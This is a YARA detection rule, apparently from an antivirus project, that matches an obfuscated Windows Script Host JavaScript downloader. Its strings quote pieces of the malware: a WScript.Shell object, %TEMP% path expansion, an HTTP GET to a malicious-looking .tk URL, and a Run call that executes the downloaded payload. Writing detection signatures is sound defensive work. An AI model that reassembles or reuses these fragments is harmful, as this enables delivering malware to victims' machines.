rule sig_20160427_c6c58e3b69b1aa6a6880981e23d53eb3 {
  meta:
    description = "datamaliciousorder - file 20160427_c6c58e3b69b1aa6a6880981e23d53eb3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "48362eace40ce7b742539dc17e5f44b052b7b62484e8b3a8a0d8c27103cdd70e"

  strings:
    $s1  = "function SgyfqUsovf() {return FqqdbZqsyo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"tBORA7e" ascii
    $s2  = "function SgyfqUsovf() {return FqqdbZqsyo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"tBORA7e" ascii
    $s3  = "function DrqfiBubdk(ZrpfrUxwir, UtfbgQogps){MnislUfiiq = MnislUfiiq * 1; return ZrpfrUxwir - UtfbgQogps;};" fullword ascii
    $s4  = "var FqqdbZqsyo = function EaemoMofgk() {return MwsftGkitk[AwqpdJqoxj](\"WScript\"+\".Shell\");}(), ThtheKlbjw = 11;" fullword ascii
    $s5  = "PsfxgLttpa[KbskePsjqa](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s6  = "var MwsftGkitk = this[\"WScript\"];" fullword ascii
    $s7  = "function LokogUmblz(BxmgwLogzo) {var YtycdDutyv = (1, 2, 3, 4, 5, BxmgwLogzo); return YtycdDutyv;};" fullword ascii
    $s8  = "if (PsfxgLttpa[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function TwdftGldpm(){return IfyctGrfxf + \"\";};" fullword ascii
    $s10 = "function QwyaaUrwix() {return ((VkawzWanap == true) && (VkawzWanap == KiccvYqeiy)) ? 1 : MnislUfiiq;};" fullword ascii
    $s11 = "}while (UsnkhImbaq);" fullword ascii
    $s12 = "function PowgtMinib()" fullword ascii
    $s13 = "return DrqfiBubdk(SnzbxQicov, UcixjSqbrj);" fullword ascii
    $s14 = "var HigyeEsesi = false;" fullword ascii
    $s15 = "function YcjelAiyyl(SvsmmNkmxt){FqqdbZqsyo[\"R\"+\"un\"](SvsmmNkmxt, MnislUfiiq, MnislUfiiq);};" fullword ascii
    $s16 = "var FglhgAolff = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "function TadlvRvqxt(){return AwqpdJqoxj;};" fullword ascii
    $s18 = "var KiccvYqeiy = false;" fullword ascii
    $s19 = "KiccvYqeiy = true; " fullword ascii
    $s20 = "VkawzWanap = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}